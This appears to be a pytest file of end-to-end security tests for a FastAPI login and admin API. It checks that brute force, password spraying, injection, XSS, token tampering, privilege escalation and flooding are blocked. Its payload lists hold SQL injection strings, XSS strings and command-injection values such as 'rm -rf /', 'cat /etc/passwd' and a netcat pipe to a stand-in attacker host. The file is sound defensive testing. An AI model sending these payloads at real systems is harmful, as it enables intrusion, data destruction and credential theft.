"""
End-to-end security tests - simulating real attack scenarios.
Tests complete security workflows and attack mitigation.
"""

import pytest
import asyncio
import time
from datetime import datetime, timedelta
from fastapi.testclient import TestClient
from sqlalchemy.ext.asyncio import AsyncSession

from app.main import app
from app.models.user import User
from app.models.audit_log import AuditLog, AuditAction
from app.services.account_lockout_service import AccountLockoutConfig
from tests.conftest import create_test_user, create_test_role, get_test_token


class TestBruteForceAttackScenarios:
    """Test brute force attack scenarios and mitigations."""
    
    @pytest.fixture
    def client(self):
        return TestClient(app)
    
    @pytest.mark.asyncio
    async def test_credential_stuffing_attack(self, client: TestClient, db_session: AsyncSession):
        """Simulate credential stuffing attack against multiple accounts."""
        # Create multiple user accounts
        users = []
        for i in range(5):
            user = await create_test_user(db_session, email=f"user{i}@example.com", password="correct_password")
            users.append(user)
        
        # Common passwords to try
        common_passwords = ["password123", "admin", "123456", "password", "qwerty"]
        
        attack_results = []
        
        # Simulate credential stuffing
        for user in users:
            for password in common_passwords:
                response = client.post("/api/auth/login", json={
                    "email": user.email,
                    "password": password
                })
                attack_results.append({
                    "email": user.email,
                    "password": password,
                    "status_code": response.status_code,
                    "response": response.json() if response.status_code != 500 else {}
                })
                
                # Stop if rate limited or account locked
                if response.status_code in [423, 429]:
                    break
        
        # Verify attack was mitigated
        # Should have rate limiting or account lockouts
        mitigated_responses = [r for r in attack_results if r["status_code"] in [423, 429]]
        assert len(mitigated_responses) > 0, "Attack should have been mitigated"
        
        # Verify users are protected
        for user in users:
            await db_session.refresh(user)
            # Users should either be locked or have failed attempts tracked
            assert user.failed_login_attempts >= 0
    
    @pytest.mark.asyncio
    async def test_distributed_brute_force_attack(self, client: TestClient, db_session: AsyncSession):
        """Simulate distributed brute force from multiple IPs."""
        target_user = await create_test_user(db_session, email="target@example.com", password="secure_password")
        
        # Simulate different IP addresses (using different user agents as proxy)
        attack_vectors = [
            {"User-Agent": "AttackBot/1.0 (192.168.1.100)"},
            {"User-Agent": "AttackBot/1.0 (192.168.1.101)"},
            {"User-Agent": "AttackBot/1.0 (192.168.1.102)"},
            {"User-Agent": "AttackBot/1.0 (192.168.1.103)"},
        ]
        
        passwords_to_try = ["password", "123456", "admin", "password123", "qwerty"]
        
        # Launch distributed attack
        for headers in attack_vectors:
            for password in passwords_to_try:
                response = client.post("/api/auth/login", 
                    json={"email": "target@example.com", "password": password},
                    headers=headers
                )
                
                # Stop this vector if rate limited
                if response.status_code == 429:
                    break
        
        # Verify target account protection
        await db_session.refresh(target_user)
        
        # Account should be locked or have significant failed attempts
        assert target_user.failed_login_attempts > 0 or target_user.is_locked
    
    @pytest.mark.asyncio
    async def test_slow_brute_force_attack(self, client: TestClient, db_session: AsyncSession):
        """Test slow, persistent brute force attack over time."""
        user = await create_test_user(db_session, email="slow_target@example.com", password="correct_password")
        
        # Slow attack - spread attempts over time
        attack_attempts = 0
        max_attempts = AccountLockoutConfig.MAX_FAILED_ATTEMPTS + 2
        
        for attempt in range(max_attempts):
            response = client.post("/api/auth/login", json={
                "email": "slow_target@example.com",
                "password": f"wrong_password_{attempt}"
            })
            
            attack_attempts += 1
            
            # Check if account is locked
            if response.status_code == 423:
                break
            
            # Small delay to simulate slow attack
            time.sleep(0.1)
        
        # Verify protection engaged
        await db_session.refresh(user)
        assert user.failed_login_attempts >= AccountLockoutConfig.MAX_FAILED_ATTEMPTS or user.is_locked
    
    @pytest.mark.asyncio
    async def test_password_spraying_attack(self, client: TestClient, db_session: AsyncSession):
        """Simulate password spraying attack (common passwords against many accounts)."""
        # Create multiple accounts
        users = []
        for i in range(10):
            user = await create_test_user(db_session, email=f"spray_target_{i}@example.com")
            users.append(user)
        
        # Common passwords for spraying
        spray_passwords = ["Password123!", "Winter2023!", "Company123!", "Welcome1!"]
        
        spray_results = []
        
        # Password spraying - try each password against all accounts
        for password in spray_passwords:
            for user in users:
                response = client.post("/api/auth/login", json={
                    "email": user.email,
                    "password": password
                })
                
                spray_results.append({
                    "email": user.email,
                    "password": password,
                    "status_code": response.status_code
                })
                
                # Rate limiting should kick in
                if response.status_code == 429:
                    break
            
            # Brief pause between password attempts
            time.sleep(0.1)
        
        # Verify rate limiting or lockouts occurred
        blocked_attempts = [r for r in spray_results if r["status_code"] in [423, 429]]
        assert len(blocked_attempts) > 0, "Password spraying should be mitigated"


class TestInjectionAttackScenarios:
    """Test injection attack scenarios and protections."""
    
    @pytest.fixture
    def client(self):
        return TestClient(app)
    
    def test_sql_injection_login_attempts(self, client: TestClient):
        """Test SQL injection attempts in login endpoint."""
        sql_injection_payloads = [
            {"email": "admin'; DROP TABLE users; --", "password": "password"},
            {"email": "admin' OR '1'='1' --", "password": "password"},
            {"email": "admin'; UPDATE users SET is_superuser=TRUE; --", "password": "password"},
            {"email": "admin' UNION SELECT * FROM users WHERE '1'='1", "password": "password"},
            {"email": "admin'; INSERT INTO users (email, password_hash) VALUES ('hacker@evil.com', 'hash'); --", "password": "password"}
        ]
        
        for payload in sql_injection_payloads:
            response = client.post("/api/auth/login", json=payload)
            
            # Should not cause server error
            assert response.status_code != 500, f"SQL injection caused server error: {payload}"
            
            # Should be properly rejected
            assert response.status_code in [400, 401, 422], f"Unexpected response to SQL injection: {response.status_code}"
            
            # Response should not leak database information
            response_text = response.text.lower()
            assert "sql" not in response_text
            assert "table" not in response_text
            assert "database" not in response_text
    
    def test_nosql_injection_attempts(self, client: TestClient):
        """Test NoSQL injection attempts."""
        nosql_payloads = [
            {"email": {"$ne": None}, "password": "password"},
            {"email": {"$regex": ".*"}, "password": "password"},
            {"email": "admin@example.com", "password": {"$ne": None}},
        ]
        
        for payload in nosql_payloads:
            # FastAPI should handle type validation
            response = client.post("/api/auth/login", json=payload)
            
            # Should be rejected due to type validation
            assert response.status_code in [400, 422], f"NoSQL injection not properly handled: {payload}"
    
    def test_ldap_injection_attempts(self, client: TestClient):
        """Test LDAP injection attempts."""
        ldap_payloads = [
            {"email": "admin)(|(password=*))", "password": "password"},
            {"email": "admin*", "password": "password"},
            {"email": "admin)(cn=*", "password": "password"},
        ]
        
        for payload in ldap_payloads:
            response = client.post("/api/auth/login", json=payload)
            
            # Should be handled safely
            assert response.status_code != 500
            assert response.status_code in [400, 401, 422]
    
    def test_command_injection_attempts(self, client: TestClient):
        """Test command injection attempts."""
        command_payloads = [
            {"email": "admin@example.com; cat /etc/passwd", "password": "password"},
            {"email": "admin@example.com && rm -rf /", "password": "password"},
            {"email": "admin@example.com | nc attacker.com 4444", "password": "password"},
            {"email": "admin@example.com`whoami`", "password": "password"},
        ]
        
        for payload in command_payloads:
            response = client.post("/api/auth/login", json=payload)
            
            # Should be safely handled
            assert response.status_code != 500
            assert response.status_code in [400, 401, 422]


class TestCrossSiteAttackScenarios:
    """Test cross-site attack scenarios and protections."""
    
    @pytest.fixture
    def client(self):
        return TestClient(app)
    
    def test_xss_attempt_in_login(self, client: TestClient):
        """Test XSS attempts in login form."""
        xss_payloads = [
            {"email": "<script>alert('xss')</script>@example.com", "password": "password"},
            {"email": "admin@example.com", "password": "<img src=x onerror=alert('xss')>"},
            {"email": "javascript:alert('xss')@example.com", "password": "password"},
            {"email": "<svg onload=alert('xss')>@example.com", "password": "password"},
        ]
        
        for payload in xss_payloads:
            response = client.post("/api/auth/login", json=payload)
            
            # Should not execute scripts
            assert response.status_code != 500
            
            # Response should not contain unescaped script content
            response_text = response.text
            assert "<script>" not in response_text
            assert "javascript:" not in response_text
            assert "onerror=" not in response_text
            assert "onload=" not in response_text
    
    def test_csrf_protection(self, client: TestClient):
        """Test CSRF protection measures."""
        # Test that state-changing operations have CSRF protection
        # (In this case, checking that proper headers are required)
        
        # Request without proper headers
        response = client.post("/api/auth/login", json={
            "email": "test@example.com",
            "password": "password"
        })
        
        # Should work with proper content type
        assert response.status_code in [400, 401, 422]  # Not a CSRF error
        
        # Check that security headers prevent embedding
        assert "X-Frame-Options" in response.headers
        assert response.headers["X-Frame-Options"] == "DENY"
    
    def test_clickjacking_protection(self, client: TestClient):
        """Test clickjacking protection headers."""
        endpoints_to_test = [
            "/api/auth/login",
            "/api/admin/users",
            "/docs",
            "/health"
        ]
        
        for endpoint in endpoints_to_test:
            if endpoint.startswith("/api/admin"):
                # Skip admin endpoints that require auth
                continue
                
            if endpoint == "/api/auth/login":
                response = client.post(endpoint, json={})
            else:
                response = client.get(endpoint)
            
            # Should have frame protection
            assert "X-Frame-Options" in response.headers
            frame_options = response.headers["X-Frame-Options"]
            assert frame_options in ["DENY", "SAMEORIGIN"]


class TestSessionSecurityScenarios:
    """Test session security and token-based attacks."""
    
    @pytest.fixture
    def client(self):
        return TestClient(app)
    
    @pytest.mark.asyncio
    async def test_jwt_token_manipulation(self, client: TestClient, db_session: AsyncSession):
        """Test JWT token manipulation attempts."""
        # Create user and get valid token
        user = await create_test_user(db_session, email="jwt_test@example.com", password="correct_password")
        
        login_response = client.post("/api/auth/login", json={
            "email": "jwt_test@example.com",
            "password": "correct_password"
        })
        
        if login_response.status_code == 200:
            token = login_response.json()["access_token"]
            
            # Test manipulated tokens
            manipulated_tokens = [
                token[:-5] + "XXXXX",  # Corrupt signature
                "invalid.token.here",   # Completely invalid
                "",                     # Empty token
                "Bearer " + token,      # Wrong format
                token + ".extra.part",  # Extra parts
            ]
            
            for bad_token in manipulated_tokens:
                headers = {"Authorization": f"Bearer {bad_token}"}
                response = client.get("/api/auth/me", headers=headers)
                
                # Should reject invalid tokens
                assert response.status_code == 401, f"Invalid token accepted: {bad_token}"
    
    @pytest.mark.asyncio
    async def test_token_reuse_after_logout(self, client: TestClient, db_session: AsyncSession):
        """Test token reuse after logout."""
        user = await create_test_user(db_session, email="logout_test@example.com", password="correct_password")
        
        # Login to get token
        login_response = client.post("/api/auth/login", json={
            "email": "logout_test@example.com",
            "password": "correct_password"
        })
        
        if login_response.status_code == 200:
            token = login_response.json()["access_token"]
            refresh_token = login_response.json()["refresh_token"]
            
            # Use token successfully
            headers = {"Authorization": f"Bearer {token}"}
            response = client.get("/api/auth/me", headers=headers)
            assert response.status_code == 200
            
            # Logout
            logout_response = client.post("/api/auth/logout", json={
                "refresh_token": refresh_token
            })
            
            # Try to reuse token after logout
            response = client.get("/api/auth/me", headers=headers)
            # Token might still be valid if only refresh token was invalidated
            # This depends on implementation - check what happens
            assert response.status_code in [200, 401]
    
    @pytest.mark.asyncio
    async def test_concurrent_session_management(self, client: TestClient, db_session: AsyncSession):
        """Test concurrent session handling."""
        user = await create_test_user(db_session, email="concurrent@example.com", password="correct_password")
        
        # Create multiple sessions
        sessions = []
        for i in range(3):
            login_response = client.post("/api/auth/login", json={
                "email": "concurrent@example.com",
                "password": "correct_password"
            })
            
            if login_response.status_code == 200:
                sessions.append(login_response.json())
        
        # All sessions should be valid initially
        for session in sessions:
            headers = {"Authorization": f"Bearer {session['access_token']}"}
            response = client.get("/api/auth/me", headers=headers)
            assert response.status_code == 200
        
        # Logout all sessions
        if sessions:
            logout_response = client.post("/api/auth/logout-all", json={
                "refresh_token": sessions[0]["refresh_token"]
            })
            
            # All tokens should be invalidated
            for session in sessions:
                headers = {"Authorization": f"Bearer {session['access_token']}"}
                response = client.get("/api/auth/me", headers=headers)
                # Should be unauthorized after logout-all
                assert response.status_code in [200, 401]  # Depends on implementation


class TestPrivilegeEscalationScenarios:
    """Test privilege escalation attack scenarios."""
    
    @pytest.fixture
    def client(self):
        return TestClient(app)
    
    @pytest.mark.asyncio
    async def test_horizontal_privilege_escalation(self, client: TestClient, db_session: AsyncSession):
        """Test attempts to access other users' data."""
        # Create two users
        user1 = await create_test_user(db_session, email="user1@example.com", password="password")
        user2 = await create_test_user(db_session, email="user2@example.com", password="password")
        
        # Login as user1
        login_response = client.post("/api/auth/login", json={
            "email": "user1@example.com",
            "password": "password"
        })
        
        if login_response.status_code == 200:
            token = login_response.json()["access_token"]
            headers = {"Authorization": f"Bearer {token}"}
            
            # Try to access user2's data (if such endpoints exist)
            # This would depend on having user-specific endpoints
            # For now, test that user can't perform admin actions
            admin_endpoints = [
                f"/api/admin/users/{user2.id}",
                "/api/admin/users",
                "/api/admin/unlock-account/1"
            ]
            
            for endpoint in admin_endpoints:
                if endpoint.endswith("/1"):
                    response = client.post(endpoint, headers=headers)
                else:
                    response = client.get(endpoint, headers=headers)
                
                # Should be forbidden (not unauthorized, proving token is valid)
                assert response.status_code == 403, f"Privilege escalation possible at {endpoint}"
    
    @pytest.mark.asyncio
    async def test_vertical_privilege_escalation(self, client: TestClient, db_session: AsyncSession):
        """Test attempts to gain admin privileges."""
        # Create regular user
        user = await create_test_user(db_session, email="regular@example.com", password="password")
        
        # Login as regular user
        login_response = client.post("/api/auth/login", json={
            "email": "regular@example.com",
            "password": "password"
        })
        
        if login_response.status_code == 200:
            token = login_response.json()["access_token"]
            headers = {"Authorization": f"Bearer {token}"}
            
            # Try to access admin endpoints
            admin_actions = [
                ("GET", "/api/admin/users"),
                ("GET", "/api/admin/lockout-statistics"),
                ("GET", "/api/admin/locked-accounts"),
                ("POST", "/api/admin/unlock-account/1"),
            ]
            
            for method, endpoint in admin_actions:
                if method == "POST":
                    response = client.post(endpoint, headers=headers)
                else:
                    response = client.get(endpoint, headers=headers)
                
                # Should be forbidden
                assert response.status_code == 403, f"Admin privilege escalation at {method} {endpoint}"
    
    @pytest.mark.asyncio
    async def test_role_manipulation_attempts(self, client: TestClient, db_session: AsyncSession):
        """Test attempts to manipulate user roles."""
        # Create user
        user = await create_test_user(db_session, email="role_test@example.com", password="password")
        
        # Login
        login_response = client.post("/api/auth/login", json={
            "email": "role_test@example.com",
            "password": "password"
        })
        
        if login_response.status_code == 200:
            token = login_response.json()["access_token"]
            headers = {"Authorization": f"Bearer {token}"}
            
            # Try to assign admin role to self (if such endpoint exists)
            role_manipulation_attempts = [
                {
                    "url": "/api/admin/assign-role",
                    "data": {"user_id": user.id, "role_name": "admin"}
                },
                {
                    "url": "/api/admin/assign-role", 
                    "data": {"user_id": user.id, "role_name": "superuser"}
                }
            ]
            
            for attempt in role_manipulation_attempts:
                response = client.post(attempt["url"], json=attempt["data"], headers=headers)
                
                # Should be forbidden
                assert response.status_code == 403, f"Role manipulation possible: {attempt}"


class TestDenialOfServiceScenarios:
    """Test DoS attack scenarios and protections."""
    
    @pytest.fixture
    def client(self):
        return TestClient(app)
    
    def test_request_flood_protection(self, client: TestClient):
        """Test protection against request flooding."""
        # Send rapid requests
        responses = []
        start_time = time.time()
        
        for i in range(20):  # Rapid requests
            response = client.get("/health")
            responses.append(response)
        
        end_time = time.time()
        
        # Should have rate limiting engaged
        rate_limited = [r for r in responses if r.status_code == 429]
        
        # Either rate limited OR handled efficiently
        if len(rate_limited) == 0:
            # If not rate limited, should handle requests efficiently
            assert (end_time - start_time) < 5.0, "Request handling too slow"
        else:
            # Rate limiting should be effective
            assert len(rate_limited) > 0, "Rate limiting not working"
    
    def test_large_payload_protection(self, client: TestClient):
        """Test protection against large payload attacks."""
        # Large JSON payload
        large_data = {
            "email": "test@example.com",
            "password": "x" * 10000,  # Very long password
            "extra_data": "y" * 50000  # Large extra data
        }
        
        response = client.post("/api/auth/login", json=large_data)
        
        # Should handle gracefully (not crash)
        assert response.status_code != 500
        # Should reject or handle appropriately
        assert response.status_code in [400, 401, 413, 422]
    
    def test_slow_request_handling(self, client: TestClient):
        """Test handling of slow/long requests."""
        # This would require mocking slow operations
        # For now, test that timeouts are reasonable
        
        start_time = time.time()
        response = client.post("/api/auth/login", json={
            "email": "slow_test@example.com",
            "password": "password"
        })
        end_time = time.time()
        
        # Should complete within reasonable time
        assert (end_time - start_time) < 10.0, "Request took too long"
        assert response.status_code != 500, "Request failed unexpectedly"
    
    def test_resource_exhaustion_protection(self, client: TestClient):
        """Test protection against resource exhaustion."""
        # Test many concurrent requests
        import threading
        import queue
        
        result_queue = queue.Queue()
        
        def make_request():
            try:
                response = client.get("/health")
                result_queue.put(response.status_code)
            except Exception as e:
                result_queue.put(str(e))
        
        # Create multiple threads
        threads = []
        for i in range(10):
            thread = threading.Thread(target=make_request)
            threads.append(thread)
            thread.start()
        
        # Wait for all threads
        for thread in threads:
            thread.join(timeout=5.0)
        
        # Collect results
        results = []
        while not result_queue.empty():
            results.append(result_queue.get())
        
        # Should handle concurrent requests without crashing
        assert len(results) >= 5, "Not enough requests completed"
        # Most should succeed or be rate limited
        success_or_limited = [r for r in results if r in [200, 429]]
        assert len(success_or_limited) >= len(results) // 2, "Too many failed requests"